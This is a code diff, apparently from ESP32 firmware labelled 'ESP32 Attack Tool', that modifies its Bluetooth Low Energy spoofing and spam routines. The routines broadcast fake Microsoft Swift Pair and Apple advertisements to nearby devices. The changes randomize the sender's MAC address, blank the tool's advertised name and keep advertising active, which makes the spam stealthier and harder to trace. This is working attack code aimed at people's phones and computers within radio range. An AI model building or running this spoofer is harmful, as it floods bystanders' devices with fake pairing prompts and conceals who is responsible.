@@ -68,22 +68,20 @@ NimBLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
         }
         
         case Microsoft: {
-            //const char* names[] = {
-            //    "Surface Pro", "Surface Book", "Surface Laptop", "Xbox Controller",
-            //    "Surface Mouse", "Surface Keyboard", "Windows Phone", "HoloLens"
-            //};
-            //const char* Name = names[rand() % 8];
-            const char *Name = generateRandomName();
-            uint8_t name_len = strlen(Name);
+            String Name = generateRandomName();
+
+            uint8_t name_len = Name.length();
+
             AdvData_Raw = new uint8_t[7 + name_len];
-            AdvData_Raw[i++] = 6 + name_len;
+
+            AdvData_Raw[i++] = 7 + name_len - 1;
             AdvData_Raw[i++] = 0xFF;
             AdvData_Raw[i++] = 0x06;
             AdvData_Raw[i++] = 0x00;
             AdvData_Raw[i++] = 0x03;
             AdvData_Raw[i++] = 0x00;
             AdvData_Raw[i++] = 0x80;
-            memcpy(&AdvData_Raw[i], Name, name_len);
+            memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
             i += name_len;
 
             AdvData.addData(std::string((char *)AdvData_Raw, 7 + name_len));
@@ -184,7 +182,7 @@ void BLEModules::initSpoofer() {
         Serial.println("[INFO] BLE already initialized, skipping...");
         return;
     }
-    NimBLEDevice::init("ESP32 Attack Tool - BLE Spoofer");
+    NimBLEDevice::init("ESP32 Attack Tool");
     esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
@@ -280,8 +278,8 @@ void BLEModules::initSpam() {
     //NimBLEServer *pServer = NimBLEDevice::createServer();
     //pAdvertising = pServer->getAdvertising();
 
-    //esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-    //esp_ble_gap_set_rand_addr(null_addr);
+    esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
+    esp_ble_gap_set_rand_addr(null_addr);
 
     ble_initialized = true;
     Serial.println("[INFO] BLE Spam Initialized Successfully!");
@@ -290,10 +288,13 @@ void BLEModules::initSpam() {
 
 void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
 {
-    uint8_t macAddr[6];
-    generateRandomMac(macAddr);
-    esp_base_mac_addr_set(macAddr);
-    NimBLEDevice::init("ESP32 Attack Tool - BLE Apple Spam");
+    esp_bd_addr_t dummy_addr = {0x00};
+    for (int i = 0; i < 6; i++) {
+      dummy_addr[i] = random(256);
+      if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
+    }
+    esp_ble_gap_set_rand_addr(dummy_addr);
+    NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
     vTaskDelay(40 / portTICK_PERIOD_MS);
@@ -305,7 +306,7 @@ void BLEModules::executeAppleSpam(EBLEPayloadType apple_mode)
     pAdvertising->start();
     vTaskDelay(20 / portTICK_PERIOD_MS);
     pAdvertising->stop();
-    NimBLEDevice::deinit();
+    //NimBLEDevice::deinit();
 }
 
 void BLEModules::executeSwiftpair(EBLEPayloadType type)
@@ -313,11 +314,17 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type)
     uint8_t macAddr[6];
     generateRandomMac(macAddr);
     esp_base_mac_addr_set(macAddr);
-    NimBLEDevice::init("ESP32 Attack Tool - BLE Swiftpair");
+    esp_bd_addr_t dummy_addr = {0x00};
+    for (int i = 0; i < 6; i++) {
+      dummy_addr[i] = random(256);
+      if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
+    }
+    esp_ble_gap_set_rand_addr(dummy_addr);
+    NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
     pAdvertising = pServer->getAdvertising();
     NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
-    pAdvertising->addServiceUUID(SERVICE_UUID);
+    //pAdvertising->addServiceUUID(SERVICE_UUID);
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
     vTaskDelay(10 / portTICK_PERIOD_MS);
